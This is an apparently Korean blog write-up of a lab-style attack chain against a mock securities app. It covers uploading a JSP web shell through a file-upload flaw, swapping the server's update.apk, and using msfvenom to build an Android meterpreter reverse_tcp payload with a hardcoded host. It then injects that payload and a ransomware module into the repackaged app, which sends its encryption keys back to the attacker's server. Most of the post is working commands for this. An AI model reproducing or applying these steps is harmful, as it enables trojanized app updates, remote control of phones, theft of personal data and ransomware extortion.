# 업데이트를 통해 안드로이드 랜섬웨어 설치 유도

## 사용 언어 및 도구

- ![Python](https://img.shields.io/badge/python-3.8%2B-blue)
- ![JavaScript](https://img.shields.io/badge/javascript-ES6%2B-yellow)
- ![jadx](https://img.shields.io/badge/jadx-v1.5-blue)
- ![Frida](https://img.shields.io/badge/frida-15.1.16-green)
- ![Java](https://img.shields.io/badge/java-17.0.11-orange)

### 1. 파일 업로드 취약점 확인

  - 확장자, 용량 필터링 부제를 확인

![](https://velog.velcdn.com/images/wearetheone/post/a80f0c86-ef56-4b67-9cc3-acfe17292bbf/image.png)

- WebShell.jsp 업로드

![](https://velog.velcdn.com/images/wearetheone/post/9c012754-f1da-4208-b555-bb8817b8c1dc/image.png)

  
### 2. Web Shell 실행

- Burp Suite에서 업로드 URL 복사

![](https://velog.velcdn.com/images/wearetheone/post/68f2e940-58f1-4785-9e2d-2c06cebd6a6e/image.png)

- 해당 URL로 Web Shell 실행

![](https://velog.velcdn.com/images/wearetheone/post/e7a86676-d852-4d6b-b794-fb8b6aaa0acf/image.png)


 - 기존 update.apk 삭제
 
 ```bash
 rm -f /home/ubuntu/cloud/backend/demo/build/libs/update.apk
 ```
 
 ![](https://velog.velcdn.com/images/wearetheone/post/e5331d6c-56f9-4609-976a-fb33c9959f55/image.png)

- 악성 apk 업로드

![](https://velog.velcdn.com/images/wearetheone/post/9cfec08d-58da-4610-8834-4ddb7469ec23/image.png)

- 백엔드 코드에서 최신 버전을 변경하여 업데이트를 유도

![](https://velog.velcdn.com/images/wearetheone/post/7a0b967c-80cc-40b1-869e-a222e301f14d/image.png)

 - 백엔드 코드를 가져온 후 빌드, 수정된 jar 파일 업로드
 
 ![](https://velog.velcdn.com/images/wearetheone/post/cfbd561f-d741-492c-8aaf-cbef07be492b/image.png)

- jar파일 실행을 위해 restart.sh 업로드
 
![](https://velog.velcdn.com/images/wearetheone/post/a40de25d-71f3-4092-a4b4-230aea25e2b8/image.png)


-  서버 재실행

```bash
mv src/main/webapp/uploads/demo-0.0.2-SNAPSHOT.jar
```

![](https://velog.velcdn.com/images/wearetheone/post/1ccbd993-2d06-4346-8684-e5b9bb7db085/image.png)

```bash
sh restart3.sh
```

### 3. 악성 모바일 애플리케이션A 제작
- 무명증권 모바일 애플리케이션을 jadx 프로그램으로 열기
- 무명증권 모바일 애플리케이션 안에 주요 기능을 담당하는 3개의 Java 코드 발견

![](https://velog.velcdn.com/images/wearetheone/post/b88397a1-555a-4680-a9b3-b5547b746d85/image.png)

- RootFridaCheckActivity 부분에 모바일 애플리케이션 업데이트 기능 확인

![](https://velog.velcdn.com/images/wearetheone/post/aba16a4a-9600-4158-b580-f2fe0319d9d4/image.png)

- Reverse Shell 기능이 있는 악성 모바일 애플리케이션 제작

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=175.120.35.228 LPORT=64444 AndroidMeterpreterDebug=true AndroidWakelock=true -o reverse.apk
```

![](https://velog.velcdn.com/images/wearetheone/post/1294282e-80ac-44a8-b6e8-1bc1b452b213/image.png)


### 4. 악성 모바일 애플리케이션B 제작 및 A랑 합치기

- 기존 모바일 애플리케이션에 랜섬웨어 기능을 추가하여 새로 모바일 애플리케이션 제작
- 기능을 만들때 id값, 비밀키, iv값을 받기 위해 공격자의 칼리 리눅스 아파치 서버 주소 첨부

![](https://velog.velcdn.com/images/wearetheone/post/734b20e8-97c8-42b6-96ae-b886893faa0f/image.png)

- 랜섬웨어 기능이 있는 무명증권 모바일 애플리케이션과 Reverse Shell 모바일 애플리케이션을 합치기

   - ApkTool을 사용하여 두 모바일 애플리케이션을 디컴파일
   
```bash
ApkTool d -f -o 파일이름 파일이름.apk
```

![](https://velog.velcdn.com/images/wearetheone/post/88328d53-688f-41e0-a48e-62ac5a5da21d/image.png)


- 악성 페이로드를 디컴파일된 무명증권 디렉토리에 복사

```bash
cp -r 악성파일이름/smali/com/metasploit 정상파일이름/smali/com
```

![](https://velog.velcdn.com/images/wearetheone/post/deb284d8-1c1c-46a9-8eb0-ddadb8774b62/image.png)


- 무명증권 모바일 애플리케이션 안에 권한 변경
   - 권한을 변경하려는 애플리케이션의 AndroidManifest.xml 파일 수정

![](https://velog.velcdn.com/images/wearetheone/post/1176e3e4-c6e1-4ae5-b546-a7f9dfb22289/image.png)

- 휴대폰 제어를 하기 위한 권한 추가

![](https://velog.velcdn.com/images/wearetheone/post/9716b605-6479-425a-8e2a-bb2dd163dd76/image.png)

- 해당 모바일 애플리케이션이 실행될 때 악성 페이로드가 동작하여 Reverse Shell이 연결되도록 설정

    - ①	MainActivity.smali 파일에 아래 코드 삽입

```bash
invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V 
```

![](https://velog.velcdn.com/images/wearetheone/post/5dd2a845-c040-4c81-aebe-f660b65f6121/image.png)


- 랜섬웨어 기능과 Reverse Shell 기능이 합쳐진 무명증권 모바일 애플리케이션 리패키징
   - ApkTool의 b 옵션을 사용해서 리패키징
   
![](https://velog.velcdn.com/images/wearetheone/post/61cb88fa-7944-4aad-a754-b6c4ac397571/image.png)


- 리패키징 후 생성된 애플리케이션 확인

![](https://velog.velcdn.com/images/wearetheone/post/3986e737-7300-4a3b-b3fc-25ed6ece79ef/image.png)


- 공격자가 만든 서명키로 서명

   - 서명키 만들기
![](https://velog.velcdn.com/images/wearetheone/post/28f075ac-77fd-48df-b908-ab9b6dc94383/image.png)

   - 공격자 키로 서명하기	

![](https://velog.velcdn.com/images/wearetheone/post/b73c2938-b96a-4844-b3ff-b993138a18e2/image.png)


### 5. 악성 모바일 애플리케이션 업로드

- 아래 명령어로 기존 모바일 애플리케이션 업데이트 파일 삭제

```bash
rm -f /home/ubuntu/cloud/backend/demo/build/libs/update.apk 
```

![](https://velog.velcdn.com/images/wearetheone/post/0ba61bff-c38a-446a-9bb3-0c7500b60a4e/image.png)

- 공격자가 만든 악성 모바일 애플리케이션 이름을 update.apk로 변경 후 업로드

![](https://velog.velcdn.com/images/wearetheone/post/31313ddc-df9c-4a01-8b1f-eb3f8a6f4f0a/image.png)


- src/main/webapp/uploads 경로에 업로드한 파일 위치 확인

![](https://velog.velcdn.com/images/wearetheone/post/f29f5025-687d-4d40-947a-e3102e5552f8/image.png)


- 공격자가 올린 update.apk을 기존 모바일 애플리케이션 업데이트 폴더로 이동

```bash
mv src/main/webapp/uploads/update.apk /home/ubuntu/cloud/backend/demo/build/libs/
```

![](https://velog.velcdn.com/images/wearetheone/post/89ac0382-626a-4ed3-83f6-0864feabd82a/image.png)

- 공격자가 올린 악성 모바일 애플리케이션으로 변경

![](https://velog.velcdn.com/images/wearetheone/post/03b22587-cb7a-469b-a7d4-65d8ebd4bd76/image.png)


- 4.3.4	모바일 애플리케이션 업데이트 기능 수정

![](https://velog.velcdn.com/images/wearetheone/post/4a56d33c-e1e6-4478-924c-1f71f33fd809/image.png)


![](https://velog.velcdn.com/images/wearetheone/post/d9f8ef89-99cb-45f1-be60-b2a5eccefa79/image.png)


- 변경된 코드로 Build
   - build.gradle 파일에서 Build 버전을 0.0.2-SNAPSHOT로 수정

![](https://velog.velcdn.com/images/wearetheone/post/7b92fc27-8833-4e42-85de-300000ba5bf4/image.png)

- Jar 파일 빌드

```bash
./gradle build
```


![](https://velog.velcdn.com/images/wearetheone/post/0c1b9b7e-207e-4aa0-9f84-13b4fbf268b1/image.png)

- ③	jar 파일 빌드를 위한 restart.sh 파일 제작

```bash
#!/bin/bash
fuser -k 8080/tcp && nohup java -jar /home/ubuntu/cloud/backend/demo/build/libs/demo-0.0.2-SNAPSHOT.jar > nohup.log 2>&1 &
```

위와 같이 실행

### 6. 사용자 악성 모바일 애플리케이션 업데이트

![](https://velog.velcdn.com/images/wearetheone/post/f0554baf-88b6-48f7-bf8a-7f779560bbd9/image.png)

### 7. 공격자가 안드로이드 랜섬웨어 실행

- 사용자가 랜섬웨어 실행 대기

```bash
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost 본인 와이파이
set lport 5555
show options
```

![](https://velog.velcdn.com/images/wearetheone/post/0542ab39-81cd-4d13-8387-02a3c8d41887/image.png)

- 사용자가 악성앱 실행

![](https://velog.velcdn.com/images/wearetheone/post/55225032-10d8-42ce-a6c5-4eae05c4c598/image.png)

- 개인 정보 탈취

![](https://velog.velcdn.com/images/wearetheone/post/21e7e336-b39c-46e4-a4cb-4a2acafe747c/image.png)

![](https://velog.velcdn.com/images/wearetheone/post/ed428ac5-8675-44a2-a5cf-3672f0ac237c/image.png)

- 공격자가 랜섬웨어 실행

```bash
am start --user 0 -n com.example.nonameappransomware/.EncryptActivity 
```

![](https://velog.velcdn.com/images/wearetheone/post/1e33f722-e7c9-4565-a1b0-e62869275185/image.png)


- 랜섬웨어가 실행되면 공격자에게 id, 비밀키값, iv값 전송

![](https://velog.velcdn.com/images/wearetheone/post/bae9268d-188a-4cda-8f47-8c58efbba1f2/image.png)



